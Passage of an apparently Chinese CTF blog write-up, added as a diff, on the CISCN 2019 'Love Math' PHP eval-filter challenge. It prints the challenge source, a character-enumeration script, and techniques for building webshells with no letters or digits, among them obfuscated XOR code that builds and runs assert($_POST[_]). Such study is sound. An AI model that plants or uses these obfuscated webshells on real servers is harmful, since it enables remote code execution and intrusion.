@@ -1,0 +1,850 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="make changes, make perfect">
+  <meta name="author" content="Dr34d">
+  <meta name="keywords" content="blog">
+  <title>【CISCN 2019初赛】Love Math - Dr34d&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/xt256.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"greydr34d.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Dr34d's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Dr34d's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/CTF_banner.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="【CISCN 2019初赛】Love Math">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-10-19 09:41" pubdate>
+        2019年10月19日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【CISCN 2019初赛】Love Math</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：9 天前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>好好复习一下国赛的数学题。。。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">https://www.cnblogs.com/20175211lyz/p/11588219.html</a> 刷题记录：[CISCN 2019 初赛]Love Math</p>
+<h1 id="0x01-题目分析"><a href="#0x01-题目分析" class="headerlink" title="0x01 题目分析"></a>0x01 题目分析</h1><p>进入之后直接给了源码：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;
+    show_source(<span class="hljs-keyword">__FILE__</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    <span class="hljs-comment">//例子 c=20-1</span>
+    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];
+    <span class="hljs-keyword">if</span> (strlen(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;太长了不会算&quot;</span>);
+    &#125;
+    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;
+        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
+    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];
+    preg_match_all(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  
+    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;
+        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
+            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);
+        &#125;
+    &#125;
+    <span class="hljs-comment">//帮你算出答案</span>
+    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);
+&#125;
+</code></pre></div>
+
+<p>限制如下：</p>
+<ol>
+<li><p>限制长度为80个字符</p>
+</li>
+<li><p>过滤了 <code> </code>‘ ‘, ‘\t’, ‘\r’, ‘\n’,’\‘’, ‘“‘, ‘`‘, ‘\[‘, ‘]‘;  ` </p>
+</li>
+<li><p>白名单里限制只使用一些数学函数</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];</code></pre></div>
+</li>
+<li><p>需要构造的就是命令执行</p>
+</li>
+</ol>
+<p>先用脚本看看还能使用哪些字符：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-variable">$unfilter_str</span> = <span class="hljs-keyword">array</span>();
+
+<span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];
+<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii</span>++) &#123;
+
+    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, chr(<span class="hljs-variable">$ascii</span>)) &amp;&amp; !in_array(chr(<span class="hljs-variable">$ascii</span>),<span class="hljs-variable">$blacklist</span>)) &#123;
+        <span class="hljs-variable">$unfilter_str</span>[] = (chr(<span class="hljs-variable">$ascii</span>));
+    &#125;
+<span class="hljs-comment">//    print_r(&#x27;\&#x27;&#x27; . implode(&#x27;\&#x27;,\&#x27;&#x27;, $unfilter_str) . &#x27;\&#x27;&#x27;);</span>
+
+&#125;
+
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;
+print_r(<span class="hljs-variable">$unfilter_str</span>);
+print_r(pi())
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>结果如下：</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php">[<span class="hljs-number">32</span>] =&gt; !
+[<span class="hljs-number">33</span>] =&gt; <span class="hljs-comment">#</span>
+[<span class="hljs-number">34</span>] =&gt; $
+[<span class="hljs-number">35</span>] =&gt; %
+[<span class="hljs-number">36</span>] =&gt; &amp;
+[<span class="hljs-number">37</span>] =&gt; (
+[<span class="hljs-number">38</span>] =&gt; )
+[<span class="hljs-number">39</span>] =&gt; *
+[<span class="hljs-number">40</span>] =&gt; +
+[<span class="hljs-number">41</span>] =&gt; ,
+[<span class="hljs-number">42</span>] =&gt; -
+[<span class="hljs-number">43</span>] =&gt; .
+[<span class="hljs-number">44</span>] =&gt; /
+[<span class="hljs-number">45</span>] =&gt; <span class="hljs-number">0</span>
+[<span class="hljs-number">46</span>] =&gt; <span class="hljs-number">1</span>
+[<span class="hljs-number">47</span>] =&gt; <span class="hljs-number">2</span>
+[<span class="hljs-number">48</span>] =&gt; <span class="hljs-number">3</span>
+[<span class="hljs-number">49</span>] =&gt; <span class="hljs-number">4</span>
+[<span class="hljs-number">50</span>] =&gt; <span class="hljs-number">5</span>
+[<span class="hljs-number">51</span>] =&gt; <span class="hljs-number">6</span>
+[<span class="hljs-number">52</span>] =&gt; <span class="hljs-number">7</span>
+[<span class="hljs-number">53</span>] =&gt; <span class="hljs-number">8</span>
+[<span class="hljs-number">54</span>] =&gt; <span class="hljs-number">9</span>
+[<span class="hljs-number">55</span>] =&gt; :
+[<span class="hljs-number">56</span>] =&gt; ;
+[<span class="hljs-number">57</span>] =&gt; &lt;
+[<span class="hljs-number">58</span>] =&gt; =
+[<span class="hljs-number">59</span>] =&gt; &gt;
+[<span class="hljs-number">60</span>] =&gt; ?
+[<span class="hljs-number">61</span>] =&gt; @
+[<span class="hljs-number">62</span>] =&gt; \
+[<span class="hljs-number">63</span>] =&gt; ^
+[<span class="hljs-number">64</span>] =&gt; &#123;
+[<span class="hljs-number">65</span>] =&gt; |
+[<span class="hljs-number">66</span>] =&gt; &#125;
+[<span class="hljs-number">67</span>] =&gt; ~</code></pre></div>
+
+<hr>
+<h1 id="0x02-知识补充"><a href="#0x02-知识补充" class="headerlink" title="0x02 知识补充"></a>0x02 知识补充</h1><h2 id="php中的函数动态执行"><a href="#php中的函数动态执行" class="headerlink" title="php中的函数动态执行"></a>php中的函数动态执行</h2><p>示例如下:</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;print_r&#x27;</span>;
+<span class="hljs-variable">$a</span>(<span class="hljs-keyword">array</span>());
+
+<span class="hljs-comment">#Array</span>
+<span class="hljs-comment">#(</span>
+<span class="hljs-comment">#)</span></code></pre></div>
+
+<p>构造webshell的时候，可以先构造出函数名，然后利用函数名来动态执行。</p>
+<h2 id="php中的函数名即为字符串"><a href="#php中的函数名即为字符串" class="headerlink" title="php中的函数名即为字符串"></a>php中的函数名即为字符串</h2><p>函数名为字符串也就是说可以对函数名进行异或，这里的白名单中还是有很多的函数名，所以可以好好利用一番</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> urlencode(ashin^pi);
+
+
+<span class="hljs-comment"># %11%1A</span></code></pre></div>
+
+
+
+<h2 id="无数字字母webshell"><a href="#无数字字母webshell" class="headerlink" title="无数字字母webshell"></a>无数字字母webshell</h2><p>参考链接：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a> 无字母数字Webshell之提高篇</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a> 一些不包含数字和字母的webshell</p>
+</li>
+</ul>
+<h5 id="一、无字母数字的webshell"><a href="#一、无字母数字的webshell" class="headerlink" title="一、无字母数字的webshell"></a>一、无字母数字的webshell</h5><p>构造主要来源：</p>
+<ol>
+<li><p>字符的异或</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span>
+<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">// $__=&#x27;_POST&#x27;;</span>
+<span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;
+<span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">// assert($_POST[_]);</span></code></pre></div>
+</li>
+<li><p>字符的取反</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php">print_r(urlencode(~<span class="hljs-string">&#x27;a&#x27;</span>));</code></pre></div>
+</li>
+<li><p>UTF-8编码的某个部分取反</p>
+<img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20191101090153209.png" alt="image-20191101090153209" style="zoom:50%;" />
+
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);
+<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;
+
+<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);
+
+<span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);
+
+<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;
+<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);</code></pre></div>
+</li>
+<li><p>通过自增和函数名或者变量类型名，然后通过[ ]索引取出字</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$_</span>=[];
+<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span>
+<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span>
+<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span></code></pre></div>
+
+<p>怎么使数组Array这个类型名变成字符串呢，这里可以利用[ ] 与Array进行字符串连接，即可得到string，也可以直接用双引号</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = [];
+var_dump( <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">$a</span>); <span class="hljs-comment">//string(5) &quot;Array&quot;</span>
+<span class="hljs-variable">$a</span> = [];
+var_dump( <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>&quot;</span>); <span class="hljs-comment">//string(5) &quot;Array&quot;</span></code></pre></div>
+
+<p>通过自增可以从’a’获取到’z’,从’A’获取到’Z’，而从Array这个字符里可以获取到大小写的a，构造起来就比较简单了。</p>
+</li>
+</ol>
+<h3 id="二、无字母数字下划线的webshell构造"><a href="#二、无字母数字下划线的webshell构造" class="headerlink" title="二、无字母数字下划线的webshell构造"></a>二、无字母数字下划线的webshell构造</h3><ol>
+<li><p>php中{}的作用：</p>
+<p>在数组中的效果差不多，就是索引</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>&#123;<span class="hljs-number">1</span>&#125;;
+<span class="hljs-comment">//b</span></code></pre></div>
+
+<p>使用索引数组的时候，利用{}可以将被包围的内容当做变量来处理</p>
+<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;abc&#x27;</span>=&gt;<span class="hljs-string">&#x27;vvvv&#x27;</span>,<span class="hljs-string">&#x27;cba&#x27;</span>=&gt;<span class="hljs-string">&#x27;sss&#x27;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$a[&#x27;abc&#x27;]&#125;</span>&quot;</span>;
+<span class="hljs-comment">//vvvv</span>
+
+<span class="hljs-comment">//这样就不行，会报语法错误</span>
+<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;abc&#x27;</span>=&gt;<span class="hljs-string">&#x27;vvvv&#x27;</span>,<span class="hljs-string">&#x27;cba&#x27;</span>=&gt;<span class="hljs-string">&#x27;sss&#x27;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[&#x27;abc&#x27;]&quot;</span>;
+
+<span class="hljs-comment">//如果只是单纯的数组的话，不加是没问题的</span>
+<span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;abc&#x27;</span>;
+<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$a</span>[1]&quot;</span>;
+<span class="hljs-comment">//b</span>
